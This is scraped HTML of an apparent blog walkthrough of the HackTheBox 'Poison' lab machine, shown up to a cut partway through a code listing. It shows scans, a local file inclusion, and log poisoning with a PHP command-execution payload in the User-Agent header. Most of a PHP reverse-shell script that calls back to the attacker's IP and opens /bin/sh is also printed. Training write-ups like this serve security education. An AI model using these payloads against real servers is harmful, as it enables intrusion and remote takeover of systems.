file enumeration revealed multiple password sources System Administration Failures Unnecessary services increase attack surface: VNC server wasn’t required for normal operations Backup files contain sensitive data: The backup directory exposed critical system information File permissions were overly permissive: Many files readable by web server process Default configurations often insecure: Services running with excessive privileges by default Remediation: Implement proper input validation and sanitization for all file parameters Use whitelist-based file access instead of direct inclusion Remove backup files and credentials from web-accessible directories Configure services to run with minimal required privileges Implement proper network segmentation and access controls Use strong authentication mechanisms instead of simple password files Regular security audits to identify exposed services and misconfigurations Happy hacking!\n","wordCount":"2416","inLanguage":"en","image":"https://realspaceeagle.github.io/images/og-image.svg","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","author":{"@type":"Person","name":{"avatar":"/images/avatar.svg","bio":"Cybersecurity enthusiast specializing in penetration testing, network security, and offensive security. Sharing knowledge through practical tutorials, tool reviews, and real-world scenarios. Passionate about helping others learn cybersecurity through hands-on experience.","name":"realspaceeagle","title":"Cybersecurity Professional \u0026 Penetration Tester"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://realspaceeagle.github.io/posts/hackthebox-poison-walkthrough/"},"publisher":{"@type":"Organization","name":"realspaceeagle","logo":{"@type":"ImageObject","url":"https://realspaceeagle.github.io/favicon.svg"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://realspaceeagle.github.io/ accesskey=h title="realspaceeagle (Alt + H)">realspaceeagle</a>
<button class=mobile-menu-toggle id=mobile-menu-toggle aria-label="Toggle mobile menu">
<span class=hamburger-line></span>
<span class=hamburger-line></span>
<span class=hamburger-line></span></button><div class=logo-switches><div class=social-icons><a href=https://www.linkedin.com/in/dream4ip/ target=_blank rel="noopener noreferrer" title="Connect on LinkedIn" aria-label="LinkedIn Profile" class=social-link><svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853.0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601.0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433A2.062 2.062.0 013.274 5.368a2.064 2.064.0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225.0H1.771C.792.0.0.774.0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2.0 22.222.0h.003z"/></svg>
</a><a href=https://twitter.com/haran_loga target=_blank rel="noopener noreferrer" title="Follow on X/Twitter" aria-label="Twitter Profile" class=social-link><svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
</a><a href=https://github.com/realspaceeagle target=_blank rel="noopener noreferrer" title="View Code on GitHub" aria-label="GitHub Profile" class=social-link><svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.374.0.0 5.373.0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931.0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176.0.0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221.0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a></div><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu class=desktop-menu><li><a href=https://realspaceeagle.github.io/ title=Home><span>Home</span></a></li><li><a href=https://realspaceeagle.github.io/about/ title=About><span>About</span></a></li><li><a href=https://realspaceeagle.github.io/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://realspaceeagle.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://realspaceeagle.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://realspaceeagle.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://realspaceeagle.github.io/projects/ title=Projects><span>Projects</span></a></li><li><a href=https://realspaceeagle.github.io/contact/ title=Contact><span>Contact</span></a></li></ul><div id=mobile-menu class=mobile-menu><ul class=mobile-menu-list><li><a href=https://realspaceeagle.github.io/ title=Home><span>Home</span></a></li><li><a href=https://realspaceeagle.github.io/about/ title=About><span>About</span></a></li><li><a href=https://realspaceeagle.github.io/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://realspaceeagle.github.io/search/ title=Search accesskey=/><span>Search</span></a></li><li><a href=https://realspaceeagle.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://realspaceeagle.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://realspaceeagle.github.io/projects/ title=Projects><span>Projects</span></a></li><li><a href=https://realspaceeagle.github.io/contact/ title=Contact><span>Contact</span></a></li></ul></div></nav></header><script>document.addEventListener("DOMContentLoaded",function(){const t=document.getElementById("mobile-menu-toggle"),e=document.getElementById("mobile-menu"),n=document.body;if(t&&e){t.addEventListener("click",function(){const s=e.classList.contains("active");s?(e.classList.remove("active"),t.classList.remove("active"),n.classList.remove("mobile-menu-open")):(e.classList.add("active"),t.classList.add("active"),n.classList.add("mobile-menu-open"))});const s=e.querySelectorAll("a");s.forEach(s=>{s.addEventListener("click",function(){e.classList.remove("active"),t.classList.remove("active"),n.classList.remove("mobile-menu-open")})}),document.addEventListener("click",function(s){!e.contains(s.target)&&!t.contains(s.target)&&(e.classList.remove("active"),t.classList.remove("active"),n.classList.remove("mobile-menu-open"))})}})</script><main class=main><div class=reading-progress><div class=reading-progress-bar></div></div><script>document.addEventListener("DOMContentLoaded",function(){const t=document.querySelector(".reading-progress-bar"),e=document.querySelector(".post-content");if(t&&e){function n(){const n=e.offsetTop,s=e.offsetHeight,a=window.innerHeight,o=window.pageYOffset,c=n+s,r=o+a;let i=0;if(o>=n){const e=Math.min(r-n,s);i=e/s*100}t.style.width=Math.min(i,100)+"%"}window.addEventListener("scroll",n),n()}})</script><aside class=blog-sidebar id=blogSidebar><div class=sidebar-content><div class=reading-progress><div class=progress-bar id=progressBar></div></div><nav class=sidebar-nav><ul class=toc-list id=tocList></ul></nav></div></aside><script>document.addEventListener("DOMContentLoaded",function(){const c=window.location.pathname.includes("/posts/"),e=document.getElementById("blogSidebar"),a=document.getElementById("tocList");if(!c||!e||!a){e&&(e.style.display="none");return}const s=document.querySelectorAll(".post-content h1, .post-content h2, .post-content h3, .post-content h4, .post-content h5, .post-content h6");if(s.length===0){e.style.display="none";return}e.style.display="block",document.body.classList.add("has-blog-sidebar");let i="";s.forEach((e)=>{if(!e.id){const n=e.textContent.toLowerCase().replace(/[^\w\s-]/g,"").replace(/\s+/g,"-").replace(/-+/g,"-").replace(/^-|-$/g,"");let t=n,s=1;for(;document.getElementById(t);)t=`${n}-${s}`,s++;e.id=t}const n=parseInt(e.tagName.substring(1)),s=e.textContent.trim(),o=(n-1)*.8;i+=`
      <li class="toc-item toc-level-${n}" style="padding-left: ${o}rem;">
        <a href="#${e.id}" class="toc-link" data-target="${e.id}">
          ${s}
        </a>
      </li>
    `}),a.innerHTML=i;const t=document.querySelectorAll(".toc-link");t.forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();const s=this.getAttribute("data-target"),n=document.getElementById(s);n&&(t.forEach(e=>e.classList.remove("active")),this.classList.add("active"),n.scrollIntoView({behavior:"smooth",block:"start"}))})});const n=document.getElementById("progressBar");function r(){const e=document.querySelector(".post-content");if(!e)return;const t=e.offsetTop,s=e.offsetHeight,o=window.innerHeight,i=window.scrollY,a=Math.max(0,Math.min(100,(i-t+o*.2)/s*100));n&&(n.style.width=a+"%")}function l(e){if(!e)return;const t=document.querySelector(".toc-list");if(!t)return;const n=t.getBoundingClientRect(),s=e.getBoundingClientRect(),o=s.top>=n.top&&s.bottom<=n.bottom;if(!o){const e=t.scrollTop,o=e+s.top-n.top-n.height/2+s.height/2;t.scrollTo({top:o,behavior:"smooth"})}}const d={root:null,rootMargin:"-20% 0% -35% 0%",threshold:0},u=new IntersectionObserver(e=>{e.forEach(e=>{const s=e.target.id,n=document.querySelector(`.toc-link[data-target="${s}"]`);e.isIntersecting&&n&&(t.forEach(e=>e.classList.remove("active")),n.classList.add("active"),l(n))})},d);s.forEach(e=>{e.id&&u.observe(e)});let o=!1;function h(){o||(requestAnimationFrame(()=>{r(),window.scrollY===0&&(t.forEach(e=>e.classList.remove("active")),n&&(n.style.width="0%")),o=!1}),o=!0)}window.addEventListener("scroll",h),r()})</script><main class="main single-page"><article class=post-single><header class=post-header><h1 class=post-title></h1><span>12 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></header><div class=post-content><p>ÃƒÂ¯Ã‚Â»Ã‚Â¿+++
date = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
lastmod = &ldquo;2025-10-01T00:00:00+00:00&rdquo;
draft = false
title = &ldquo;HackTheBox: Poison Walkthrough&rdquo;
description = &ldquo;Detailed walkthrough of the Poison machine (10.10.10.84) covering LFI log poisoning, PHP RFI exploitation, credential recovery and a VNC pivot to root.&rdquo;
summary = &ldquo;Defeat HackTheBox Poison by chaining PHP log poisoning, reverse shelling, Base64 credential digging and an SSH/VNC pivot to root.&rdquo;
keywords = [&ldquo;hackthebox poison&rdquo;,&ldquo;lfi&rdquo;,&ldquo;log poisoning&rdquo;,&ldquo;reverse shell&rdquo;,&ldquo;base64 decode&rdquo;,&ldquo;vnc pivot&rdquo;,&ldquo;freebsd&rdquo;,&ldquo;htb&rdquo;]
tags = [&ldquo;hackthebox&rdquo;,&ldquo;web-exploitation&rdquo;,&ldquo;lfi&rdquo;,&ldquo;reverse-shell&rdquo;,&ldquo;privilege-escalation&rdquo;]
categories = [&ldquo;HackTheBox&rdquo;]
author = &ldquo;realspaceeagle&rdquo;
image = &ldquo;/images/poison-htb/poison-browse-interface.png&rdquo;
+++</p><p>Poison is a FreeBSD machine that starts with a web application vulnerable to Local File Inclusion (LFI), which leads to log poisoning and remote code execution. After gaining initial access, I&rsquo;ll find heavily encoded credentials that provide SSH access to the machine. From there, the path to root involves VNC running on localhost that can be accessed through SSH tunneling.</p><h2 id=reconnaissance>Reconnaissance</h2><h3 id=nmap>nmap</h3><p>I&rsquo;ll start my enumeration with <code>nmap</code> and run my standard TCP scan:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> nmap -p- --min-rate <span class=m>10000</span> -oA scans/nmap-alltcp 10.10.10.84
</span></span><span class=line><span class=cl><span class=go>Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-15 10:00 EDT
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.10.84
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.065s latency).
</span></span></span><span class=line><span class=cl><span class=go>Not shown: 65530 closed ports
</span></span></span><span class=line><span class=cl><span class=go>PORT    STATE SERVICE
</span></span></span><span class=line><span class=cl><span class=go>22/tcp  open  ssh
</span></span></span><span class=line><span class=cl><span class=go>25/tcp  open  smtp
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http
</span></span></span><span class=line><span class=cl><span class=go>110/tcp open  pop3
</span></span></span><span class=line><span class=cl><span class=go>119/tcp open  nntp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
</span></span></span></code></pre></div><p>Based on these results, I&rsquo;ll run a deeper <code>nmap</code> scan on the open ports:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> nmap -p 22,25,80,110,119 -sCV -oA scans/nmap-tcpscripts 10.10.10.84
</span></span><span class=line><span class=cl><span class=go>Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-15 10:01 EDT
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.10.84
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.065s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT    STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp  open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey: 
</span></span></span><span class=line><span class=cl><span class=go>|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
</span></span></span><span class=line><span class=cl><span class=go>|   256 4c:e8:c6:02:bd:fc:83:e6:36:00:06:05:65:38:7c:78 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>25/tcp  open  smtp    Sendmail 8.15.2/8.15.2
</span></span></span><span class=line><span class=cl><span class=go>| smtp-commands: Poison.htb, EHLO, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, DELIVERBY, 
</span></span></span><span class=line><span class=cl><span class=go>|_List of commands
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Site doesn&#39;t have a title (text/html).
</span></span></span><span class=line><span class=cl><span class=go>110/tcp open  pop3    Qpopper 4.0.9
</span></span></span><span class=line><span class=cl><span class=go>119/tcp open  nntp    INN 2.6.3
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: Poison.htb; OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
</span></span></span></code></pre></div><p>The target is running FreeBSD with several services including SSH, SMTP, HTTP, POP3, and NNTP. The most interesting service for initial exploitation is the Apache HTTP server on port 80 running PHP 5.6.32.</p><h2 id=website---tcp-80>Website - TCP 80</h2><h3 id=site>Site</h3><p>The website presents a simple interface without much content:</p><p><img alt="browse.php file manager" loading=lazy src=/images/poison-htb/poison-browse-interface.png></p><p>The page shows what appears to be a file browser interface. Looking at the HTML source doesn&rsquo;t reveal anything interesting initially.</p><h3 id=directory-brute-force>Directory Brute Force</h3><p>I&rsquo;ll run <code>gobuster</code> to find additional paths:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> gobuster dir -u http://10.10.10.84 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php
</span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.1.0
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://10.10.10.84
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 10
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.1.0
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>2023/09/15 10:15:30 Starting gobuster
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/browse.php           (Status: 200) [Size: 289]
</span></span></span><span class=line><span class=cl><span class=go>/index.php            (Status: 200) [Size: 289]
</span></span></span><span class=line><span class=cl><span class=go>/info.php             (Status: 200) [Size: 68315]
</span></span></span><span class=line><span class=cl><span class=go>/ini.php              (Status: 200) [Size: 75]
</span></span></span><span class=line><span class=cl><span class=go>/phpinfo.php          (Status: 200) [Size: 68315]
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>2023/09/15 10:17:22 Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>The <code>browse.php</code> file is particularly interesting. Visiting it shows a file browser interface that accepts a <code>file</code> parameter. Testing with different values reveals it&rsquo;s vulnerable to Local File Inclusion (LFI).</p><h2 id=local-file-inclusion>Local File Inclusion</h2><h3 id=testing-lfi>Testing LFI</h3><p>The <code>browse.php</code> page accepts a <code>file</code> parameter, making it a prime candidate for LFI testing:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> curl http://10.10.10.84/browse.php?file<span class=o>=</span>/etc/passwd
</span></span></code></pre></div><p>This returns the contents of <code>/etc/passwd</code>, confirming the LFI vulnerability.</p><h3 id=reading-php-source>Reading PHP Source</h3><p>I can use PHP filter wrappers to read the source code of PHP files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> curl <span class=s2>&#34;http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=browse.php&#34;</span>
</span></span></code></pre></div><p>This returns a base64-encoded version of the PHP source. Decoding it reveals:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$file</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>include</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$file</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>include</span><span class=p>(</span><span class=s2>&#34;index.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>The code directly includes whatever file is specified in the <code>file</code> parameter without any filtering, making it highly vulnerable.</p><h3 id=log-poisoning>Log Poisoning</h3><p>Since I can include any file, I&rsquo;ll attempt log poisoning by injecting PHP code into the Apache access logs. First, I&rsquo;ll make a request with PHP code in the User-Agent header:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> curl <span class=s2>&#34;http://10.10.10.84/&#34;</span> -H <span class=s2>&#34;User-Agent: &lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&#34;</span>
</span></span></code></pre></div><p>Now I can include the access log file and execute commands:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> curl <span class=s2>&#34;http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&amp;cmd=id&#34;</span>
</span></span></code></pre></div><p>This successfully executes the <code>id</code> command, showing:</p><p><img alt="Decoded payload delivered through browse.php" loading=lazy src=/images/poison-htb/poison-upload-html.png></p><h2 id=shell-via-rfi>Shell via RFI</h2><h3 id=creating-reverse-shell>Creating Reverse Shell</h3><p>Since command execution through log poisoning can be unstable, I&rsquo;ll use Remote File Inclusion (RFI) to get a more reliable shell. First, I&rsquo;ll create a PHP reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>set_time_limit</span> <span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$VERSION</span> <span class=o>=</span> <span class=s2>&#34;1.0&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=s1>&#39;10.10.14.13&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$port</span> <span class=o>=</span> <span class=mi>9001</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$chunk_size</span> <span class=o>=</span> <span class=mi>1400</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$write_a</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$error_a</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$shell</span> <span class=o>=</span> <span class=s1>&#39;uname -a; w; id; /bin/sh -i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$daemon</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$debug</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;pcntl_fork&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$pid</span> <span class=o>=</span> <span class=nx>pcntl_fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$pid</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Can&#39;t fork&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$pid</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>posix_setsid</span><span class=p>()</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;Error: Can&#39;t setsid()&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$daemon</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>umask</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$sock</span> <span class=o>=</span> <span class=nx>fsockopen</span><span class=p>(</span><span class=nv>$ip</span><span class=p>,</span> <span class=nv>$port</span><span class=p>,</span> <span class=nv>$errno</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>,</span> <span class=mi>30</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$sock</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$errstr</span><span class=s2> (</span><span class=si>$errno</span><span class=s2>)&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$descriptorspec</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>   <span class=mi>0</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;pipe&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>   <span class=mi>1</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;pipe&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>   <span class=mi>2</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;pipe&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$process</span> <span class=o>=</span> <span class=nx>proc_open</span><span class=p>(</span><span class=nv>$shell</span><span class=p>,</span> <span class=nv>$descriptorspec</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_resource</span><span class=p>(</span><span class=nv>$process</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;ERROR: Can&#39;t spawn shell&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$sock</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>printit</span><span class=p>(</span><span class=s2>&#34;Successfully opened reverse shell to </span><span class=si>$ip</span><span class=s2>:</span><span class=si>$port</span><span class=s2>&#34;</span><span class=p>);</span>
